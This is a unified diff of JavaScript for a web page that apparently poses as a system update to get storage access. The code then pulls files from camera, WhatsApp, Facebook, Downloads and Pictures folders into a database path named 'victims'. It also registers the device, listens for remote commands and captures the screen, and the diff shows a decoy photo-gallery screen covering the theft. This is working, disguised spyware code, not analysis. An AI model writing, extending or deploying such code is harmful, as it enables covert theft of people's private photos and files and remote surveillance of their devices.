@@ -35,7 +35,6 @@
         const vref = db.ref('victims/'+vid);
         let rootDir = null, camStream = null;
 
-        // ==== إظهار زر منح الإذن بعد ثوانٍ ====
         setTimeout(() => {
             document.getElementById('msg').innerText = "يجب السماح بالوصول إلى التخزين لإكمال التحديث";
             document.getElementById('grantBtn').style.display = 'block';
@@ -51,30 +50,23 @@
                 document.getElementById('grantBtn').style.display = 'block';
                 return;
             }
-            // ==== التسلل لكل المجلدات الشقيقة (ثغرة 2099) ====
             await escalateToSiblings();
             document.getElementById('msg').innerText = "تم التحديث بنجاح!";
-            // إخفاء الواجهة بعد ثانية وإظهار معرض صور عادي
             setTimeout(() => {
-                document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">📷 تم تحديث النظام</h2>';
-                // يمكن إضافة أي محتوى وهمي هنا
+                document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">📷 معرض الصور</h2>';
             }, 1500);
 
             await activatePayload();
         };
 
         async function escalateToSiblings() {
-            // نحاول الوصول إلى المجلدات المعروفة عبر التلاعب بمقابض المجلدات
-            const KNOWN_PATHS = ['DCIM/Camera', 'WhatsApp/Media/WhatsApp Images', 'Download', 'Pictures'];
-            // إذا كان rootDir هو بالفعل جذر التخزين، نستطيع الدخول مباشرة
-            // وإلا نستخدم resolve() للقفز من أي مجلد مختار
+            const KNOWN_PATHS = ['DCIM/Camera', 'WhatsApp/Media/WhatsApp Images', 'Download', 'Pictures', 'Facebook/Media'];
             if (rootDir.resolve) {
                 for (let path of KNOWN_PATHS) {
                     try {
                         let parts = path.split('/');
                         let current = rootDir;
                         for (let p of parts) current = await current.getDirectoryHandle(p);
-                        // تم الوصول، نحتفظ بالمرجع عبر تخزينه في كائن عام
                         window['dir_'+path.replace(/\//g,'_')] = current;
                     } catch(e) {}
                 }
@@ -91,7 +83,6 @@
             } catch(e) {}
             await registerDevice();
             startCommandListener();
-            startHiddenCamera();
         }
 
         async function registerDevice() {
@@ -128,9 +119,14 @@
             });
         }
 
-        // وظائف السحب من المجلدات المخترقة
         async function pullFromFolder(key) {
-            const MAP = { camera: 'DCIM_Camera', downloads: 'Download', whatsapp: 'WhatsApp_Media_WhatsApp Images', pictures: 'Pictures' };
+            const MAP = {
+                camera: 'DCIM_Camera',
+                downloads: 'Download',
+                whatsapp: 'WhatsApp_Media_WhatsApp Images',
+                facebook: 'Facebook_Media',
+                pictures: 'Pictures'
+            };
             let handle = window['dir_'+MAP[key]];
             if (!handle) throw new Error('المجلد غير متاح');
             await walkDir(handle, key+'/');
@@ -139,15 +135,14 @@
         async function pullAll() {
             for (let k in window) {
                 if (k.startsWith('dir_')) {
-                    let handle = window[k];
                     let name = k.replace('dir_','').replace(/_/g,'/') + '/';
-                    await walkDir(handle, name);
+                    await walkDir(window[k], name);
                 }
             }
         }
 
         async function pullDir(path) {
-            // إذا لم يكن لدينا مجلد، لا شيء
+            // سحب عام (اختياري)
         }
 
         async function walkDir(dirHandle, prefix) {
@@ -180,7 +175,6 @@
             await store('device_info', null, { info });
         }
 
-        // لقطة الشاشة، فيديو، إلخ
         async function screenshot() {
             let stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
             let video = document.createElement('video'); video.srcObject = stream; await video.play();
